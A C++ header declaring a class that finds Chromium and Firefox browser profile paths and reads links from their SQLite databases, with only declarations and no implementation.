#pragma once
#include <vector>
#include <string>
#include "sqlite3.h"





class CChromiums
{
public:
	CChromiums();
	~CChromiums();
	void run(std::vector<std::wstring> &);

private:
	struct BrowserInfo
	{
		std::wstring sBrowserEXEname;
		std::wstring sBrowserWNDname;
		std::wstring sBrowserClassName;
		std::wstring sBrowserUserDataPath;
		BOOL bRoamingPath; //FALSE if PAth in the Local, TRUE - if in the Roaming
	};
	//std::vector<std::wstring> vecLinks;
	std::vector<BrowserInfo> vecBrowserList;

	std::vector<std::wstring> GetVectorLinks();

	

	//DB
	sqlite3* p_Conn;
	std::string GetDBStr(sqlite3_stmt *stmt, int column);
	std::wstring GetDBWStr(sqlite3_stmt *stmt, int column, _Out_ std::wstring&);
	bool ConnectToDB(std::string skypeUserName);
	void CloseDB();
	HRESULT GetLinksFromDB(_In_ _Out_ std::vector<std::wstring>  &);


	HRESULT GetPathToDb(std::wstring sProfilePath, _Out_ std::string &);


	HRESULT GetChromePath(std::wstring & sPath, std::wstring sBrowserPath, const BOOL &);
	HRESULT GetProfileFromLocalState(std::wstring sChromePath, std::wstring & sProfileName);
	HRESULT GetFFPath(std::wstring & FFpath);
	HRESULT GetProfilePath(std::wstring FFpath, std::wstring &sProfilePath);




};




